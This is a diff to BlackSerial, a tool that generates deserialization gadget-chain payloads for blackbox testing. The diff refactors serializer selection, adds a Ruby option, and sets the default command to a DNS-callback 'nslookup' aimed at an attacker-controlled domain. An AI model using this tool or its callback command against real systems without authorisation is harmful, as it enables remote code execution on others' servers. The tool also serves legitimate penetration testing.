@@ -43,15 +43,15 @@ def setupLogging(no_color, verbose):
         logger.setLevel(logging.INFO)
 
 def createGenerator(serializer, args):
-    if serializer == 'phpggc' or serializer == 'php':
+    if serializer in ['phpggc', 'php']:
         generator = PHPGGC(args.phpggc_path, args)
-    elif serializer == 'ysoserial' or serializer == 'java':
+    elif serializer in ['ysoserial', 'java']:
         generator = YSOSerial(args.java_path, args.ysoserial_path, args)
-    elif serializer == 'pickle' or serializer == 'python':
+    elif serializer in ['pickle', 'python']:
         generator = Pickle(args)
-    elif serializer == 'ysoserial.net' or serializer == 'csharp':
+    elif serializer in ['ysoserial.net', 'csharp']:
         generator = YSOSerialNet(args.wine_path, args.ysoserial_net_path, args)
-    elif serializer == 'ruby':
+    elif serializer in ['ruby', 'ruby-unsafe-deserialization']:
         generator = Ruby(args.ruby_path, args.ruby_payload_path, args)
     else:
         logging.error(f"Unsupported serializer: {serializer}")
@@ -63,8 +63,8 @@ if __name__ == '__main__':
 
     title = "BlackSerial"
     description = "Blackbox Gadget Chain Payloads Generator (@darkpills)"
-    default_system_command = 'nslookup %%domain%%'
-    available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net']
+    default_system_command = 'nslookup %%chain_id%%.%%domain%%'
+    available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net', 'ruby-unsafe-deserialization']
     available_languages = ['java', 'php', 'python', 'csharp', 'ruby']
 
     parser = argparse.ArgumentParser(prog='BlackSerial', description=description, formatter_class=argparse.ArgumentDefaultsHelpFormatter)
